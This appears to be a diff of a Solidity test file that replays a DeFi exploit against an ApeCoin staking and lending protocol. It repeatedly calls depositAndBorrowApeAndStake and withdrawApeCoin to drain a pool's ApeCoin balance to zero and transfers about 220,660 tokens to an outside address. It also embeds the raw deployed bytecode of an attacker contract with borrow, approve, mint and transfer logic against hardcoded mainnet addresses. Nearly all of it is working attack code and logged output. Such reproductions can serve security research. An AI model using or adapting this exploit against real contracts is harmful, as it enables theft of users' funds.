+                S5[] memory arr913 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr912, arr913);
+            }
+            {
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v17 = 68590000000000000000000;
+                uint256 v17 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "68590000000000000000000 (68590.0 ether)");
+
+                uint256[] memory arr919 = new uint256[](0);
+                uint256[] memory arr920 = new uint256[](0);
+                S1 memory s1107 = S1(arr919, arr920);
+                S2 memory s2107 = S2(xbc4c, 0, 0);
+                S3 memory s3491 = S3(9829, 10094000000000000000000);
+                S3[] memory arr921 = new S3[](1);
+                arr921[0] = s3491;
+                S4[] memory arr922 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s1107, s2107, arr921, arr922);
+
+                S3 memory s3496 = S3(9829, 10094000000000000000000);
+                S3[] memory arr930 = new S3[](1);
+                arr930[0] = s3496;
+                S5[] memory arr931 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr930, arr931);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v18 = 58496000000000000000000;
+                uint256 v18 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "58496000000000000000000 (58496.0 ether)");
+
+                uint256[] memory arr937 = new uint256[](0);
+                uint256[] memory arr938 = new uint256[](0);
+                S1 memory s1109 = S1(arr937, arr938);
+                S2 memory s2109 = S2(xbc4c, 0, 0);
+                S3 memory s3501 = S3(9829, 10094000000000000000000);
+                S3[] memory arr939 = new S3[](1);
+                arr939[0] = s3501;
+                S4[] memory arr940 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s1109, s2109, arr939, arr940);
+
+                S3 memory s3506 = S3(9829, 10094000000000000000000);
+                S3[] memory arr948 = new S3[](1);
+                arr948[0] = s3506;
+                S5[] memory arr949 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr948, arr949);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v19 = 48402000000000000000000;
+                uint256 v19 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "48402000000000000000000 (48402.0 ether)");
+
+                uint256[] memory arr955 = new uint256[](0);
+                uint256[] memory arr956 = new uint256[](0);
+                S1 memory s1111 = S1(arr955, arr956);
+                S2 memory s2111 = S2(xbc4c, 0, 0);
+                S3 memory s3511 = S3(9829, 10094000000000000000000);
+                S3[] memory arr957 = new S3[](1);
+                arr957[0] = s3511;
+                S4[] memory arr958 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s1111, s2111, arr957, arr958);
+
+                S3 memory s3516 = S3(9829, 10094000000000000000000);
+                S3[] memory arr966 = new S3[](1);
+                arr966[0] = s3516;
+                S5[] memory arr967 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr966, arr967);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v20 = 38308000000000000000000;
+                uint256 v20 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "38308000000000000000000 (38308.0 ether)");
+
+                uint256[] memory arr973 = new uint256[](0);
+                uint256[] memory arr974 = new uint256[](0);
+                S1 memory s1113 = S1(arr973, arr974);
+                S2 memory s2113 = S2(xbc4c, 0, 0);
+                S3 memory s3521 = S3(9829, 10094000000000000000000);
+                S3[] memory arr975 = new S3[](1);
+                arr975[0] = s3521;
+                S4[] memory arr976 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s1113, s2113, arr975, arr976);
+
+                S3 memory s3526 = S3(9829, 10094000000000000000000);
+                S3[] memory arr984 = new S3[](1);
+                arr984[0] = s3526;
+                S5[] memory arr985 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr984, arr985);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v21 = 28214000000000000000000;
+                uint256 v21 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "28214000000000000000000 (28214.0 ether)");
+
+                uint256[] memory arr991 = new uint256[](0);
+                uint256[] memory arr992 = new uint256[](0);
+                S1 memory s1115 = S1(arr991, arr992);
+                S2 memory s2115 = S2(xbc4c, 0, 0);
+                S3 memory s3531 = S3(9829, 10094000000000000000000);
+                S3[] memory arr993 = new S3[](1);
+                arr993[0] = s3531;
+                S4[] memory arr994 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s1115, s2115, arr993, arr994);
+
+                S3 memory s3536 = S3(9829, 10094000000000000000000);
+                S3[] memory arr1002 = new S3[](1);
+                arr1002[0] = s3536;
+                S5[] memory arr1003 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr1002, arr1003);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v22 = 18120000000000000000000;
+                uint256 v22 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "18120000000000000000000 (18120.0 ether)");
+
+                uint256[] memory arr1009 = new uint256[](0);
+                uint256[] memory arr1010 = new uint256[](0);
+                S1 memory s1117 = S1(arr1009, arr1010);
+                S2 memory s2117 = S2(xbc4c, 0, 0);
+                S3 memory s3541 = S3(9829, 10094000000000000000000);
+                S3[] memory arr1011 = new S3[](1);
+                arr1011[0] = s3541;
+                S4[] memory arr1012 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s1117, s2117, arr1011, arr1012);
+
+                S3 memory s3546 = S3(9829, 10094000000000000000000);
+                S3[] memory arr1020 = new S3[](1);
+                arr1020[0] = s3546;
+                S5[] memory arr1021 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr1020, arr1021);
+            }
+            {
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v23 = 8026000000000000000000;
+                uint256 v23 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "8026000000000000000000 (8026.0 ether)");
+
+                uint256[] memory arr1027 = new uint256[](0);
+                uint256[] memory arr1028 = new uint256[](0);
+                S1 memory s1119 = S1(arr1027, arr1028);
+                S2 memory s2119 = S2(xbc4c, 0, 0);
+                S3 memory s3551 = S3(9829, 8026000000000000000000);
+                S3[] memory arr1029 = new S3[](1);
+                arr1029[0] = s3551;
+                S4[] memory arr1030 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s1119, s2119, arr1029, arr1030);
+
+                S3 memory s3556 = S3(9829, 8026000000000000000000);
+                S3[] memory arr1038 = new S3[](1);
+                arr1038[0] = s3556;
+                S5[] memory arr1039 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr1038, arr1039);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v24 = 0;
+                uint256 v24 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", uint256(0));
+                // uint256 v25 = 225237682165404022135955;
+                uint256 v25 = I(x4d22).balanceOf(r);
+                console2.log("I(x4d22).balanceOf(r)\t\t->", "225237682165404022135955 (225237.6821 ether)");
+                I(x4d22).transfer(xac4b, 220660000000000000000000);
+            }
+            return;
+        }
+    }
+
+    function _constructor_() public {
+        bytes memory rt = abi.encodePacked(
+            hex"608060405260043610620000d95760003560e01c80637515db00116200008b57",
+            hex"8063c09d42671162000061578063c09d4267146200029a578063e9cbafb01462",
+            hex"0002c8578063ec2c740a14620002f6578063fd24b937146200032457620000e1",
+            hex"565b80637515db00146200021057806378dc94f2146200023e5780637e56402f",
+            hex"146200026c57620000e1565b8063035973c114620000e65780630824252e1462",
+            hex"000114578063150b7a02146200014257806340fd18db14620001865780634183",
+            hex"411e14620001b45780634ee7222614620001e257620000e1565b36620000e157",
+            hex"005b600080fd5b348015620000f357600080fd5b506200011260048036038101",
+            hex"906200010c919062002f05565b62000352565b005b3480156200012157600080",
+            hex"fd5b506200014060048036038101906200013a919062002faa565b6200041e56",
+            hex"5b005b3480156200014f57600080fd5b506200016e6004803603810190620001",
+            hex"68919062002fdc565b62000493565b6040516200017d9190620030af565b6040",
+            hex"5180910390f35b3480156200019357600080fd5b50620001b260048036038101",
+            hex"90620001ac919062002faa565b620004a8565b005b348015620001c157600080",
+            hex"fd5b50620001e06004803603810190620001da919062002faa565b6200053156",
+            hex"5b005b348015620001ef57600080fd5b506200020e6004803603810190620002",
+            hex"089190620030cc565b620005a9565b005b3480156200021d57600080fd5b5062",
+            hex"00023c600480360381019062000236919062002faa565b62000612565b005b34",
+            hex"80156200024b57600080fd5b506200026a600480360381019062000264919062",
+            hex"003113565b62000686565b005b3480156200027957600080fd5b506200029860",
+            hex"048036038101906200029291906200316f565b62000790565b005b3480156200",
+            hex"02a757600080fd5b50620002c66004803603810190620002c0919062002faa56",
+            hex"5b62000915565b005b348015620002d557600080fd5b50620002f46004803603",
+            hex"810190620002ee9190620031b6565b62000984565b005b348015620003035760",
+            hex"0080fd5b506200032260048036038101906200031c919062002faa565b620014",
+            hex"72565b005b3480156200033157600080fd5b5062000350600480360381019062",
+            hex"00034a919062003236565b620014f3565b005b60008054906101000a900473ff",
+            hex"ffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffff",
+            hex"ffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff",
+            hex"1614620003ab57600080fd5b8273ffffffffffffffffffffffffffffffffffff",
+            hex"ffff168282604051620003d4929190620032ab565b600060405180830381855a",
+            hex"f49150503d806000811462000411576040519150601f19603f3d011682016040",
+            hex"523d82523d6000602084013e62000416565b606091505b505050505050565b60",
+            hex"008054906101000a900473ffffffffffffffffffffffffffffffffffffffff16",
+            hex"73ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffff",
+            hex"ffffffffffffffffffffffff16146200047757600080fd5b6000600460026001",
+            hex"171790506200048f8282620015d0565b5050565b600063150b7a0260e01b9050",
+            hex"95945050505050565b60008054906101000a900473ffffffffffffffffffffff",
+            hex"ffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16",
+            hex"3373ffffffffffffffffffffffffffffffffffffffff16146200050157600080",
+            hex"fd5b600061020061010060406020601060086004600260011717171717171717",
+            hex"90506200052d8282620015d0565b5050565b60008054906101000a900473ffff",
+            hex"ffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffff",
+            hex"ffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16",
+            hex"146200058a57600080fd5b600060086004600260011717179050620005a58282",
+            hex"620015d0565b5050565b60008054906101000a900473ffffffffffffffffffff",
+            hex"ffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff",
+            hex"163373ffffffffffffffffffffffffffffffffffffffff161462000602576000",
+            hex"80fd5b6200060e8282620015d0565b5050565b60008054906101000a900473ff",
+            hex"ffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffff",
+            hex"ffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff",
+            hex"16146200066b57600080fd5b6000610200610100179050620006828282620015",
+            hex"d0565b5050565b60008054906101000a900473ffffffffffffffffffffffffff",
+            hex"ffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373",
+            hex"ffffffffffffffffffffffffffffffffffffffff1614620006df57600080fd5b",
+            hex"600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffff",
+            hex"ffffffffffffffffffffffffffff160362000718573390505b8273ffffffffff",
+            hex"ffffffffffffffffffffffffffffff166323b872dd3083856040518463ffffff",
+            hex"ff1660e01b81526004016200075793929190620032e8565b6000604051808303",
+            hex"81600087803b1580156200077257600080fd5b505af115801562000787573d60",
+            hex"00803e3d6000fd5b50505050505050565b60008054906101000a900473ffffff",
+            hex"ffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffff",
+            hex"ffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614",
+            hex"620007e957600080fd5b600073ffffffffffffffffffffffffffffffffffffff",
+            hex"ff168173ffffffffffffffffffffffffffffffffffffffff1603620008225733",
+            hex"90505b8173ffffffffffffffffffffffffffffffffffffffff1663a9059cbb82",
+            hex"8473ffffffffffffffffffffffffffffffffffffffff166370a0823130604051",
+            hex"8263ffffffff1660e01b81526004016200087a919062003325565b6020604051",
+            hex"80830381865afa15801562000898573d6000803e3d6000fd5b50505050604051",
+            hex"3d601f19601f82011682018060405250810190620008be919062003359565b60",
+            hex"40518363ffffffff1660e01b8152600401620008dd9291906200338b565b6000",
+            hex"60405180830381600087803b158015620008f857600080fd5b505af115801562",
+            hex"00090d573d6000803e3d6000fd5b505050505050565b60008054906101000a90",
+            hex"0473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffff",
+            hex"ffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffff",
+            hex"ffffff16146200096e57600080fd5b600060809050620009808282620015d056",
+            hex"5b5050565b73ac4b3dacb91461209ae9d41ec517c2b9cb1b7daf73ffffffffff",
+            hex"ffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffff",
+            hex"ffffffffffff161462000a09576040517f08c379a00000000000000000000000",
+            hex"0000000000000000000000000000000000815260040162000a00906200341956",
+            hex"5b60405180910390fd5b600080838381019062000a1d9190620030cc565b9150",
+            hex"9150734d224452801aced8b2f0aebe155379bb5d59438173ffffffffffffffff",
+            hex"ffffffffffffffffffffffff1663095ea7b37373625745ed66f0d4c68c916130",
+            hex"86ece1fc5a0119846040518363ffffffff1660e01b815260040162000a869291",
+            hex"906200338b565b6020604051808303816000875af115801562000aa6573d6000",
+            hex"803e3d6000fd5b505050506040513d601f19601f820116820180604052508101",
+            hex"9062000acc919062003478565b507373625745ed66f0d4c68c91613086ece1fc",
+            hex"5a011973ffffffffffffffffffffffffffffffffffffffff1663a0712d688360",
+            hex"40518263ffffffff1660e01b815260040162000b1c9190620034aa565b602060",
+            hex"4051808303816000875af115801562000b3c573d6000803e3d6000fd5b505050",
+            hex"506040513d601f19601f8201168201806040525081019062000b629190620033",
+            hex"59565b5060007373625745ed66f0d4c68c91613086ece1fc5a011973ffffffff",
+            hex"ffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff",
+            hex"1660e01b815260040162000bb4919062003325565b602060405180830381865a",
+            hex"fa15801562000bd2573d6000803e3d6000fd5b505050506040513d601f19601f",
+            hex"8201168201806040525081019062000bf8919062003359565b90507373625745",
+            hex"ed66f0d4c68c91613086ece1fc5a011973ffffffffffffffffffffffffffffff",
+            hex"ffffffffff1663095ea7b3733b2da9304bd1308dc0d1b2f9c3c14f4cf016a955",
+            hex"836040518363ffffffff1660e01b815260040162000c5f9291906200338b565b",
+            hex"6020604051808303816000875af115801562000c7f573d6000803e3d6000fd5b",
+            hex"505050506040513d601f19601f8201168201806040525081019062000ca59190",
+            hex"62003478565b50733b2da9304bd1308dc0d1b2f9c3c14f4cf016a95573ffffff",
+            hex"ffffffffffffffffffffffffffffffffff1663a0712d68826040518263ffffff",
+            hex"ff1660e01b815260040162000cf59190620034aa565b60206040518083038160",
+            hex"00875af115801562000d15573d6000803e3d6000fd5b505050506040513d601f",
+            hex"19601f8201168201806040525081019062000d3b919062003359565b50600060",
+            hex"0183161462000d535762000d5262001681565b5b6000600283161462000d7057",
+            hex"62000d69620017d7565b6001819055505b6000600154905062000e0773736257",
+            hex"45ed66f0d4c68c91613086ece1fc5a011973ffffffffffffffffffffffffffff",
+            hex"ffffffffffff16633b1d21a26040518163ffffffff1660e01b81526004016020",
+            hex"60405180830381865afa15801562000ddb573d6000803e3d6000fd5b50505050",
+            hex"6040513d601f19601f8201168201806040525081019062000e01919062003359",
+            hex"565b620019f1565b6000600484161462000e1f5762000e1e8162001c1b565b5b",
+            hex"6000600884161462000e4b5762000e4a7337b614714e96227d81ffffbdbdc448",
+            hex"9e46eace8c62001fd8565b5b6000601084161462000e775762000e76735cd407",
+            hex"de334525c710fa485a8e19d8e98ade39e862001fd8565b5b6000602084161462",
+            hex"000ea35762000ea2730b7d8eda67ce2555abe41d2df2102d62becf38bd62001f",
+            hex"d8565b5b6000604084161462000ecf5762000ece736a55080d5ba7cff935fb6a",
+            hex"c54f4af4486ee24b1c62001fd8565b5b600061010084161462000f115762000f",
+            hex"1073e9373ca88004bbf192b05a6460afd05a88d9e1bc7323012599f9abba61cb",
+            hex"1a62d3785af7e434f692c6620022f7565b5b600061020084161462000f535762",
+            hex"000f5273b77441172e72d93dde9742de23c0562d3090966f737d0b6fb139408a",
+            hex"f77f1c5bfdc8bd9166f5901304620022f7565b5b60006080841614620012b357",
+            hex"739c1c49b595d5c25f0ccc465099e6d9d0a1e5ab3773ffffffffffffffffffff",
+            hex"ffffffffffffffffffff1663c5ebeaec671bc16d674ec800006040518263ffff",
+            hex"ffff1660e01b815260040162000fb6919062003514565b602060405180830381",
+            hex"6000875af115801562000fd6573d6000803e3d6000fd5b505050506040513d60",
+            hex"1f19601f8201168201806040525081019062000ffc919062003359565b50735f",
+            hex"0a4a59c8b39cddbcf0c683a6374655b4f5d76e73ffffffffffffffffffffffff",
+            hex"ffffffffffffffff1663a9059cbb739c1c49b595d5c25f0ccc465099e6d9d0a1",
+            hex"e5ab37735f0a4a59c8b39cddbcf0c683a6374655b4f5d76e73ffffffffffffff",
+            hex"ffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e0",
+            hex"1b815260040162001091919062003325565b602060405180830381865afa1580",
+            hex"15620010af573d6000803e3d6000fd5b505050506040513d601f19601f820116",
+            hex"82018060405250810190620010d5919062003359565b6040518363ffffffff16",
+            hex"60e01b8152600401620010f49291906200338b565b6020604051808303816000",
+            hex"875af115801562001114573d6000803e3d6000fd5b505050506040513d601f19",
+            hex"601f820116820180604052508101906200113a919062003478565b5062001145",
+            hex"62002cd9565b600167ffffffffffffffff811115620011635762001162620035",
+            hex"31565b5b60405190808252806020026020018201604052801562001192578160",
+            hex"2001602082028036833780820191505090505b508160000181905250600067ff",
+            hex"ffffffffffffff811115620011b957620011b862003531565b5b604051908082",
+            hex"528060200260200182016040528015620011e857816020016020820280368337",
+            hex"80820191505090505b5081602001819052508181600001516000815181106200",
+            hex"120d576200120c62003560565b5b602002602001018181525050730b89032e27",
+            hex"22b103386adccae18b2f5d4986afa073ffffffffffffffffffffffffffffffff",
+            hex"ffffffff16635468c7308260000151836020015184602001516040518463ffff",
+            hex"ffff1660e01b815260040162001278939291906200365d565b60006040518083",
+            hex"0381600087803b1580156200129357600080fd5b505af1158015620012a8573d",
+            hex"6000803e3d6000fd5b5050505050620012bf565b620012be81620025e1565b5b",
+            hex"8784620012cd9190620036de565b734d224452801aced8b2f0aebe155379bb5d",
+            hex"59438173ffffffffffffffffffffffffffffffffffffffff166370a082313060",
+            hex"40518263ffffffff1660e01b81526004016200131c919062003325565b602060",
+            hex"405180830381865afa1580156200133a573d6000803e3d6000fd5b5050505060",
+            hex"40513d601f19601f820116820180604052508101906200136091906200335956",
+            hex"5b1015620013af576000600114620013ae576040517f08c379a0000000000000",
+            hex"000000000000000000000000000000000000000000008152600401620013a590",
+            hex"62003769565b60405180910390fd5b5b734d224452801aced8b2f0aebe155379",
+            hex"bb5d59438173ffffffffffffffffffffffffffffffffffffffff1663a9059cbb",
+            hex"73ac4b3dacb91461209ae9d41ec517c2b9cb1b7daf8a87620014029190620036",
+            hex"de565b6040518363ffffffff1660e01b8152600401620014219291906200338b",
+            hex"565b6020604051808303816000875af115801562001441573d6000803e3d6000",
+            hex"fd5b505050506040513d601f19601f8201168201806040525081019062001467",
+            hex"919062003478565b505050505050505050565b60008054906101000a900473ff",
+            hex"ffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffff",
+            hex"ffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff",
+            hex"1614620014cb57600080fd5b6000604060206010600860046002600117171717",
+            hex"17179050620014ef8282620015d0565b5050565b60008054906101000a900473",
+            hex"ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffff",
+            hex"ffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffff",
+            hex"ff16146200154c57600080fd5b600073ffffffffffffffffffffffffffffffff",
+            hex"ffffffff168173ffffffffffffffffffffffffffffffffffffffff1603620015",
+            hex"85573390505b8073ffffffffffffffffffffffffffffffffffffffff166108fc",
+            hex"479081150290604051600060405180830381858888f193505050501580156200",
+            hex"15cc573d6000803e3d6000fd5b5050565b73ac4b3dacb91461209ae9d41ec517",
+            hex"c2b9cb1b7daf73ffffffffffffffffffffffffffffffffffffffff1663490e6c",
+            hex"bc30846000868660405160200162001619929190620037b0565b604051602081",
+            hex"8303038152906040526040518563ffffffff1660e01b81526004016200164994",
+            hex"93929190620038bd565b600060405180830381600087803b1580156200166457",
+            hex"600080fd5b505af115801562001679573d6000803e3d6000fd5b505050505050",
+            hex"565b6000600167ffffffffffffffff811115620016a157620016a06200353156",
+            hex"5b5b604051908082528060200260200182016040528015620016d05781602001",
+            hex"602082028036833780820191505090505b509050733b2da9304bd1308dc0d1b2",
+            hex"f9c3c14f4cf016a95581600081518110620016ff57620016fe62003560565b5b",
+            hex"602002602001019073ffffffffffffffffffffffffffffffffffffffff169081",
+            hex"73ffffffffffffffffffffffffffffffffffffffff1681525050730518b21f49",
+            hex"548427ef0c16ff26ce8a05295f745473ffffffffffffffffffffffffffffffff",
+            hex"ffffffff1663c2998238826040518263ffffffff1660e01b8152600401620017",
+            hex"889190620039df565b6000604051808303816000875af1158015620017a8573d",
+            hex"6000803e3d6000fd5b505050506040513d6000823e3d601f19601f8201168201",
+            hex"8060405250810190620017d3919062003b2e565b5050565b6000739c1c49b595",
+            hex"d5c25f0ccc465099e6d9d0a1e5ab3773ffffffffffffffffffffffffffffffff",
+            hex"ffffffff1663c5ebeaec68367b2d3f48239400006040518263ffffffff1660e0",
+            hex"1b815260040162001831919062003bc2565b6020604051808303816000875af1",
+            hex"15801562001851573d6000803e3d6000fd5b505050506040513d601f19601f82",
+            hex"01168201806040525081019062001877919062003359565b50735f0a4a59c8b3",
+            hex"9cddbcf0c683a6374655b4f5d76e73ffffffffffffffffffffffffffffffffff",
+            hex"ffffff1663095ea7b3735f0a4a59c8b39cddbcf0c683a6374655b4f5d76e6836",
+            hex"7b2d3f48239400006040518363ffffffff1660e01b8152600401620018e69291",
+            hex"9062003bdf565b6020604051808303816000875af115801562001906573d6000",
+            hex"803e3d6000fd5b505050506040513d601f19601f820116820180604052508101",
+            hex"906200192c919062003478565b506000735f0a4a59c8b39cddbcf0c683a63746",
+            hex"55b4f5d76e73ffffffffffffffffffffffffffffffffffffffff1663f109fa3b",
+            hex"60016040518263ffffffff1660e01b81526004016200197f919062003c4f565b",
+            hex"6000604051808303816000875af11580156200199f573d6000803e3d6000fd5b",
+            hex"505050506040513d6000823e3d601f19601f8201168201806040525081019062",
+            hex"0019ca919062003b2e565b905080600081518110620019e357620019e2620035",
+            hex"60565b5b602002602001015191505090565b620019fb62002cd9565b600067ff",
+            hex"ffffffffffffff81111562001a195762001a1862003531565b5b604051908082",
+            hex"52806020026020018201604052801562001a4857816020016020820280368337",
+            hex"80820191505090505b508160000181905250600067ffffffffffffffff811115",
+            hex"62001a6f5762001a6e62003531565b5b60405190808252806020026020018201",
+            hex"604052801562001a9e5781602001602082028036833780820191505090505b50",
+            hex"816020018190525062001ab162002cf3565b73bc4ca0eda7647a8ab7c2061c2e",
+            hex"118a18a936f13d816000019073ffffffffffffffffffffffffffffffffffffff",
+            hex"ff16908173ffffffffffffffffffffffffffffffffffffffff16815250506000",
+            hex"8160200181815250508281604001818152505060008067ffffffffffffffff81",
+            hex"111562001b315762001b3062003531565b5b6040519080825280602002602001",
+            hex"8201604052801562001b6e57816020015b62001b5a62002d2a565b8152602001",
+            hex"9060019003908162001b505790505b50905060008067ffffffffffffffff8111",
+            hex"1562001b905762001b8f62003531565b5b604051908082528060200260200182",
+            hex"01604052801562001bcd57816020015b62001bb962002d68565b815260200190",
+            hex"60019003908162001baf5790505b50905060008484848460405162001be49062",
+            hex"002dae565b62001bf3949392919062003ffa565b604051809103906000f08015",
+            hex"801562001c10573d6000803e3d6000fd5b509050505050505050565b73bc4ca0",
+            hex"eda7647a8ab7c2061c2e118a18a936f13d73ffffffffffffffffffffffffffff",
+            hex"ffffffffffff1663a22cb465730b89032e2722b103386adccae18b2f5d4986af",
+            hex"a060016040518363ffffffff1660e01b815260040162001c819291906200406d",
+            hex"565b600060405180830381600087803b15801562001c9c57600080fd5b505af1",
+            hex"15801562001cb1573d6000803e3d6000fd5b5050505062001cbf62002cd9565b",
+            hex"600167ffffffffffffffff81111562001cdd5762001cdc62003531565b5b6040",
+            hex"5190808252806020026020018201604052801562001d0c578160200160208202",
+            hex"8036833780820191505090505b508160000181905250600067ffffffffffffff",
+            hex"ff81111562001d335762001d3262003531565b5b604051908082528060200260",
+            hex"20018201604052801562001d6257816020016020820280368337808201915050",
+            hex"90505b50816020018190525081816000015160008151811062001d875762001d",
+            hex"8662003560565b5b60200260200101818152505062001d9d62002cf3565b73bc",
+            hex"4ca0eda7647a8ab7c2061c2e118a18a936f13d816000019073ffffffffffffff",
+            hex"ffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffff",
+            hex"ffffffffff168152505060008160200181815250506000816040018181525050",
+            hex"60008067ffffffffffffffff81111562001e1e5762001e1d62003531565b5b60",
+            hex"405190808252806020026020018201604052801562001e5b57816020015b6200",
+            hex"1e4762002d2a565b81526020019060019003908162001e3d5790505b50905060",
+            hex"008067ffffffffffffffff81111562001e7d5762001e7c62003531565b5b6040",
+            hex"5190808252806020026020018201604052801562001eba57816020015b62001e",
+            hex"a662002d68565b81526020019060019003908162001e9c5790505b509050730b",
+            hex"89032e2722b103386adccae18b2f5d4986afa073ffffffffffffffffffffffff",
+            hex"ffffffffffffffff1663d6a584fb670de0b6b3a76400006040518263ffffffff",
+            hex"1660e01b815260040162001f149190620040dd565b6000604051808303816000",
+            hex"87803b15801562001f2f57600080fd5b505af115801562001f44573d6000803e",
+            hex"3d6000fd5b50505050730b89032e2722b103386adccae18b2f5d4986afa073ff",
+            hex"ffffffffffffffffffffffffffffffffffffff1663057c8f3885858585604051",
+            hex"8563ffffffff1660e01b815260040162001f9d949392919062003ffa565b6000",
+            hex"60405180830381600087803b15801562001fb857600080fd5b505af115801562",
+            hex"001fcd573d6000803e3d6000fd5b505050505050505050565b6000730518b21f",
+            hex"49548427ef0c16ff26ce8a05295f745473ffffffffffffffffffffffffffffff",
+            hex"ffffffffff16635ec88c79306040518263ffffffff1660e01b81526004016200",
+            hex"2029919062003325565b606060405180830381865afa15801562002047573d60",
+            hex"00803e3d6000fd5b505050506040513d601f19601f8201168201806040525081",
+            hex"01906200206d9190620040fa565b5091505060008273ffffffffffffffffffff",
+            hex"ffffffffffffffffffff16633b1d21a26040518163ffffffff1660e01b815260",
+            hex"0401602060405180830381865afa158015620020bf573d6000803e3d6000fd5b",
+            hex"505050506040513d601f19601f82011682018060405250810190620020e59190",
+            hex"62003359565b9050600060405180602001604052807301b7234e6b24003e88b4",
+            hex"e22d0a8d574432d3dff673ffffffffffffffffffffffffffffffffffffffff16",
+            hex"63fc57d4df876040518263ffffffff1660e01b81526004016200214391906200",
+            hex"3325565b602060405180830381865afa15801562002161573d6000803e3d6000",
+            hex"fd5b505050506040513d601f19601f8201168201806040525081019062002187",
+            hex"919062003359565b81525090506000620021a68360008462002c259092919063",
+            hex"ffffffff16565b9050838111156200226d578473ffffffffffffffffffffffff",
+            hex"ffffffffffffffff1663c5ebeaec60018460000151670de0b6b3a76400008862",
+            hex"0021ea919062004156565b620021f69190620041d0565b620022029190620042",
+            hex"08565b6040518263ffffffff1660e01b8152600401620022209190620034aa56",
+            hex"5b6020604051808303816000875af115801562002240573d6000803e3d6000fd",
+            hex"5b505050506040513d601f19601f820116820180604052508101906200226691",
+            hex"9062003359565b50620022f0565b8473ffffffffffffffffffffffffffffffff",
+            hex"ffffffff1663c5ebeaec846040518263ffffffff1660e01b8152600401620022",
+            hex"a89190620034aa565b6020604051808303816000875af1158015620022c8573d",
+            hex"6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250",
+            hex"810190620022ee919062003359565b505b5050505050565b60008173ffffffff",
+            hex"ffffffffffffffffffffffffffffffff1663b01c1ecc6040518163ffffffff16",
+            hex"60e01b8152600401602060405180830381865afa15801562002345573d600080",
+            hex"3e3d6000fd5b505050506040513d601f19601f82011682018060405250810190",
+            hex"6200236b919062003359565b9050600068367b2d3f48239400008473ffffffff",
+            hex"ffffffffffffffffffffffffffffffff16633b1d21a26040518163ffffffff16",
+            hex"60e01b8152600401602060405180830381865afa158015620023c5573d600080",
+            hex"3e3d6000fd5b505050506040513d601f19601f82011682018060405250810190",
+            hex"620023eb919062003359565b620023f79190620041d0565b9050818110156200",
+            hex"2406578091505b8373ffffffffffffffffffffffffffffffffffffffff1663c5",
+            hex"ebeaec670de0b6b3a7640000846103ed6200243b919062004156565b62002447",
+            hex"919062004156565b6040518263ffffffff1660e01b8152600401620024659190",
+            hex"620034aa565b6020604051808303816000875af115801562002485573d600080",
+            hex"3e3d6000fd5b505050506040513d601f19601f82011682018060405250810190",
+            hex"620024ab919062003359565b508273ffffffffffffffffffffffffffffffffff",
+            hex"ffffff1663095ea7b384670de0b6b3a7640000856103ed620024e29190620041",
+            hex"56565b620024ee919062004156565b6040518363ffffffff1660e01b81526004",
+            hex"016200250d9291906200338b565b6020604051808303816000875af115801562",
